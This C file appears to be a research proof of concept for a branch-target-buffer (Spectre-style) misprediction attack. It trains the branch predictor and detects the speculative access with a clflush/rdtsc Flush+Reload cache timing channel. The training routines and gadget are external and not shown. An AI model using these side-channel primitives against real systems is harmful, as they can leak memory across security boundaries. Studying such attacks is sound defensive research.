#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <setjmp.h>

#define PAGE_SIZE 4096


// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void maccess_wr(void *p, int val) { asm volatile("movq %%rax, (%1)\n" : : "a"(val), "c"(p) : ); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void mfence() { asm volatile("mfence"); }

// ---------------------------------------------------------------------------
__attribute__((always_inline)) inline void lfence() { asm volatile("lfence"); }

__attribute__((always_inline)) inline uint64_t rdtsc() {
    uint64_t a = 0, d = 0;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(a), "=d"(d));
    asm volatile("mfence");

    return (d << 32) | a;
}


jmp_buf trycatch_buf;

void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void trycatch_segfault_handler(int signum) {
    //online cpu
    (void)signum;
    unblock_signal(SIGSEGV);
    unblock_signal(SIGILL);
    unblock_signal(SIGBUS);
    longjmp(trycatch_buf, 1);
}

//extern void s_faulty_load(size_t addr);

void setup_fh(){
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGILL, trycatch_segfault_handler);
	signal(SIGBUS, trycatch_segfault_handler);
}

extern void caller(void);
extern void caller_wrapper(void);

void myprint(uint64_t x){
    printf("x: %lx\n\n", x);
}

extern uint8_t probe_array[256*4096];

extern void train_btb(void *p);
extern void f1();
extern void f2();

#define CACHE_MISS 220


int main(int argc, char ** argv){

    // detect_cache_miss_threshold();

    // write probe_array to avoid page fault
    for(int i = 0; i < 256; i++){
        probe_array[i * 4096] = 1;
    }


    // check the gadget address
    // printf("gadget address: %p\n", gadget);

    do{
        int results[256] = {0};
        for(int try = 0; try < 1000; ++try){
            for (size_t i = 0; i < 256; i++) {
                size_t mix_i = ((i * 167) + 13) & 255;
                flush(&probe_array[mix_i * 4096]);
            }

            // pass the address of f1 into train_btb to train the btb
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);
            train_btb(f1);

            flush(&probe_array[0x6c*4096]);
            // mfence();

            // pass the address of f2 into train_btb to trigger the btb misprediction
            train_btb(f2);

            for (size_t i = 0; i < 256; i++) {
                size_t mix_i = ((i * 167) + 13) & 255;
                uint64_t t1 = rdtsc();
                maccess(&probe_array[mix_i * 4096]);
                uint64_t t2 = rdtsc() - t1;
                if (t2 < CACHE_MISS && mix_i != 0x6d) {
                    results[mix_i]++;
                    // printf("t2 = %ld\n", t2);
                }
            }

            // printf("return from rsb: %#x\n", c);
        
        }


        // find max
        int max = 0;
        int idx = 0;
        for(int i = 0; i < 256; ++i){
            if(results[i] > max){
                max = results[i];
                idx = i;
            }
        }

        printf("idx: %x score: %d\n", idx, results[idx]);
        
    }while(1);

    return 0;
}
